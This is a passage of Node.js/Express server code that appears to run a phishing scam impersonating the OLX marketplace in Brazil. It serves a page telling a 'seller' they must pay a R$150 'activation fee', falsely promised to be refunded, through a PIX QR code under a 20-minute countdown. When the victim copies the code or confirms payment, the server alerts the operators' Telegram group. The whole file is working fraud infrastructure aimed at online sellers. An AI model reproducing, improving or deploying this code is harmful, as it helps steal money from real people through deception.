        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 968.19 513"><path d="M183.46,423.61c-55.23,0-93.32-46.27-93.32-114.69,0-69.09,38.09-115.36,93.32-115.36s93.31,46.27,93.31,114.7c0,69.08-38.09,115.35-93.31,115.35m0,86.69c102.2,0,183.45-86,183.45-202,0-114.7-76.81-201.38-183.45-201.38C81.25,106.88,0,192.91,0,308.92,0,425.57,76.81,510.3,183.46,510.3" fill="#6e0ad6" fill-rule="evenodd"/><path d="M442.45,356.49H617.66c12.06,0,19-7.17,19-19.56V280.24c0-12.38-7-19.55-19-19.55H500.22V19.55c0-12.38-7-19.55-19-19.55H423.41c-12.06,0-19,7.17-19,19.55V317.39c0,25.41,13.33,39.1,38.08,39.1" fill="#8ce563" fill-rule="evenodd"/><path d="M680.51,504.42,785.88,380l102.2,124.47c8.89,11.09,20.32,11.09,30.47,2l41.27-37.15c10.15-9.12,11.42-20.85,1.9-31.28L848.09,307.61,951.56,188.34c8.89-10.42,8.26-21.51-1.9-31.28l-38.72-35.84c-10.16-9.78-21.59-9.13-30.48,2L785.88,235.92,689.39,123.17c-8.88-10.43-20.31-11.73-30.47-2l-40,36.49c-10.16,9.78-10.79,20.21-1.27,31.28L723,308.26l-114.9,131c-9.53,11.07-8.26,22.15,1.9,31.28l40,35.84c10.16,9.13,21.59,8.47,30.47-2" fill="#f28000" fill-rule="evenodd"/></svg>
                </header>
        <div class="min-h-screen flex items-center justify-center p-4">
        <div class="bg-white shadow-lg rounded-2xl p-6 max-w-lg w-full border-t-4 border-orange-500">
            <h2 class="text-xl font-bold text-orange-700 mb-4">Parabéns pela venda!</h2>
            <p class="text-gray-700 mb-3">No entanto, você ainda não atingiu a pontuação necessária como vendedor em nossa plataforma. Para garantir a segurança de todos, implementamos uma política para prevenir fraudes e garantir que somente vendedores confiáveis possam concluir transações.</p>
            <h3 class="text-lg font-bold text-orange-500 mb-2">Taxa de Comissão para Garantia de Segurança</h3>
            <p class="text-gray-700 mb-3">Por questão de segurança e para garantir que você realmente deseja vender seu produto, será cobrada uma taxa de comissão. Esta taxa ajuda a validar o processo e evitar fraudes em nosso sistema. Não se preocupe, esse valor será devolvido junto com o valor da sua venda!</p>
            <p class="text-gray-900 font-semibold mb-3">Taxa de Ativação: <span class="text-orange-500">R$ 150,00</span></p>
            <button id="btnPagar" class="bg-green-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-green-600">Pagar Taxa</button>
        </div>
    </div>

    <!-- Modal QR Code -->
    <div id="modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
        <div class="bg-white p-6 rounded-lg shadow-lg text-center relative w-96">
            <h3 class="text-lg font-bold text-purple-700 mb-2">QR Code para Pagamento</h3>
            <div id="qrcode" class="my-4"></div>
            
            <!-- Timer Container -->
            <div class="timer-container">
                <div id="timer-active">
                    <div id="timer-display" class="timer-display">--:--</div>
                    <div class="timer-label">Tempo restante para o QR Code</div>
                </div>
                <div id="timer-expired" class="hidden">
                    <div class="expired-message">
                        Tempo do Qrcode esgotado por gentileza solicite um novo Qrcode com seu atendente pelo Whatssap.
                    </div>
                </div>
            </div>
            
            <button id="btnCopiar" class="bg-purple-700 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-purple-800">Copiar Código</button>
            <button id="btnRedirecionar" class="hidden bg-blue-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-blue-600">
                Confirmar Pagamento
            </button>

            <button id="btnFechar" class="absolute top-2 right-2 text-gray-500">&times;</button>
        </div>
    </div>

    <script>
        // Timer functionality
        let timeLeft = null;
        let timerInterval;
        
        // Format time as MM:SS
        function formatTime(seconds) {
    if (seconds === null) return '--:--';
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return minutes.toString().padStart(2, '0') + ':' + remainingSeconds.toString().padStart(2, '0');
}

        
        // Update timer display
        function updateTimerDisplay() {
            document.getElementById('timer-display').textContent = formatTime(timeLeft);
        }
        
        // Show expired message
        function showExpiredMessage() {
            document.getElementById('timer-active').classList.add('hidden');
            document.getElementById('timer-expired').classList.remove('hidden');
            document.getElementById('btnRedirecionar').classList.add('hidden');
            document.getElementById('btnCopiar').classList.add('hidden');
        }
        
        // Start timer
        function startTimer() {
            // Check if there's a saved end time in localStorage
            const savedEndTime = localStorage.getItem("qrCodeTimerEnd");
            
            if (savedEndTime) {
                const endTime = parseInt(savedEndTime, 10);
                const now = Date.now();
                
                // If timer hasn't expired yet
                if (endTime > now) {
                    timeLeft = Math.floor((endTime - now) / 1000);
                } else {
                    // Timer has expired
                    timeLeft = 0;
                    updateTimerDisplay();
                    showExpiredMessage();
                    return;
                }
            } else {
                // Set a new 20-minute timer
                const endTime = Date.now() + 20 * 60 * 1000;
                localStorage.setItem("qrCodeTimerEnd", endTime.toString());
                timeLeft = 20 * 60;
            }
            
            updateTimerDisplay();
            
            // Clear any existing interval
            if (timerInterval) {
                clearInterval(timerInterval);
            }
            
            // Set up interval to update timer
            timerInterval = setInterval(function() {
                timeLeft--;
                updateTimerDisplay();
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    showExpiredMessage();
                }
            }, 1000);
        }
        
        // Reset timer
        function resetTimer() {
            const endTime = Date.now() + 20 * 60 * 1000;
            localStorage.setItem("qrCodeTimerEnd", endTime.toString());
            timeLeft = 20 * 60;
            
            document.getElementById('timer-expired').classList.add('hidden');
            document.getElementById('timer-active').classList.remove('hidden');
            document.getElementById('btnCopiar').classList.remove('hidden');
            
            startTimer();
        }

        // Original code
        document.getElementById("btnPagar").addEventListener("click", function () {
            document.getElementById("modal").classList.remove("hidden");
            new QRCode(document.getElementById("qrcode"), {
                text: "${produto.qr}", // Substitua pelo link real de pagamento
                width: 200,
                height: 200
            });
            
            // Start the timer when QR code is displayed
            startTimer();
        });
        
        document.getElementById("btnCopiar").addEventListener("click", function () {
            const codigo = "${produto.qr}"; 
            const actionId = "${produto.actionId}"; 

            navigator.clipboard.writeText(codigo).then(() => {
                fetch("/notificar-copia", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ 
                        codigo: codigo,
                        actionId: actionId
                    })
                });

                // Aguarda 20 segundos para mostrar o botão
                setTimeout(() => {
                    // Only show the button if timer hasn't expired
                    if (timeLeft > 0) {
                        document.getElementById("btnRedirecionar").classList.remove("hidden");
                    }
                }, 2000);
            });
        });

        // Adiciona o evento de clique no botão que aparecerá depois
        document.getElementById("btnRedirecionar").addEventListener("click", function () {
            window.location.href = "${RENDER_URL}/analise?id=${produto.actionId}";
        });

        document.getElementById("btnFechar").addEventListener("click", function () {
            document.getElementById("modal").classList.add("hidden");
            document.getElementById("qrcode").innerHTML = ""; // Limpa o QR Code ao fechar
            
            // Clear timer interval when modal is closed
            if (timerInterval) {
                clearInterval(timerInterval);
            }
        });
    </script>
</body>
</html>


        `);
    } catch (error) {
        console.error('Erro:', error);
        res.status(500).send('Ocorreu um erro no processamento');
    }
});

const multer = require('multer');
const upload = multer({ dest: 'uploads/' });
function escapeMarkdownV2(text) {
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&"); 
}



app.post("/notificar-copia", async (req, res) => {
    console.log("📩 Dados recebidos no servidor:", req.body);

    const { codigo, actionId } = req.body;
    if (!codigo || !actionId) {
        return res.status(400).json({ error: "Código ou ActionId não fornecido!" });
    }

    const data = loadData();
    const acao = data.acoes[actionId];
    
    if (!acao) {
        return res.status(404).json({ error: "Ação não encontrada!" });
    }

    const produto = data.produtos[acao.produtoId];

    if (!produto) {
        return res.status(404).json({ error: "Produto não encontrado!" });
    }

    const chatId = process.env.GROUP_CHAT_ID;
    if (!chatId) {
        console.error("❌ ERRO: GROUP_CHAT_ID não está definido!");
        return res.status(500).json({ error: "Configuração inválida do servidor." });
    }

    // Apenas o ID do produto na mensagem
    const username = produto.username || "Desconhecido"; // Captura o nome do usuário

const mensagem = `📢🃏  Código copiado, 👤 usuário: @${escapeMarkdownV2(username)} para o produto: \`${escapeMarkdownV2(produto.id)}\``;



    try {
        await bot.telegram.sendMessage(chatId, mensagem, { parse_mode: "MarkdownV2" });
        console.log("✅ Notificação enviada com sucesso!");
        res.status(200).json({ message: "Notificação enviada!" });
    } catch (error) {
        console.error("❌ Erro ao enviar notificação:", error);
        res.status(500).json({ error: "Erro ao notificar no Telegram." });
    }
});

app.get('/analise', async (req, res) => {
    try {
        const actionId = req.query.id; // Obtém o ID da ação da URL
        const data = loadData(); // Carrega os dados salvos

        if (!actionId) {
            return res.status(400).send("ID da ação não fornecido!");
        }

        const acao = data.acoes[actionId];
        if (!acao) {
            return res.status(404).send("Ação não encontrada!");
        }

        const produto = data.produtos[acao.produtoId];
        if (!produto) {
            return res.status(404).send("Produto não encontrado!");
        }

        // Agora que produto foi definido corretamente, podemos usá-lo
        await bot.telegram.sendMessage(GROUP_CHAT_ID, `🂡♠️  PAGAMENTO EFETUADO 👤 Usuário: ${produto.username || "Desconhecido"}`);

        res.send(`
            <!DOCTYPE html>
            <html lang="pt-br">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Pagamento em Análise</title>
                <style>
                    body {
                        font-family: 'Poppins', sans-serif;
                        margin: 0;
                        padding: 0;
                        background-color: #f8f9fa;
                        text-align: center;
                    }
                    .container {
                        max-width: 500px;
                        margin: 10vh auto;
                        padding: 20px;
                        background: white;
                        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
                        border-radius: 10px;
                    }
                    h1 {
                        color:rgb(3, 97, 0);
                        font-size: 24px;
                    }
                    p {
                        color: #444;
                        font-size: 16px;
                    }
                    .btn {
                        display: inline-block;
                        margin-top: 15px;
                        padding: 10px 20px;
                        background-color:rgb(250, 194, 38);
                        color: white;
                        text-decoration: none;
                        font-size: 16px;
                        border-radius: 5px;
                        transition: 0.3s;
                    }
                    .btn:hover {
                        background-color:rgb(252, 193, 33);
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Pagamento em Análise</h1>
                    <p>Detectamos que seu pagamento está sendo analisado. Para garantir sua transação, por favor, envie o comprovante para seu atendente.</p>
                </div>
            </body>
            </html>
        `);
    } catch (error) {
        console.error("Erro ao enviar mensagem para o Telegram:", error);
        res.status(500).send("Erro interno no servidor.");
    }
});


const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`🟢 Servidor rodando em: ${RENDER_URL}`);
    
    // Só inicia o bot via polling em desenvolvimento
    if (process.env.NODE_ENV !== 'production') {
        bot.launch();
        console.log('🤖 Bot iniciado via polling (modo desenvolvimento)');
    }
});











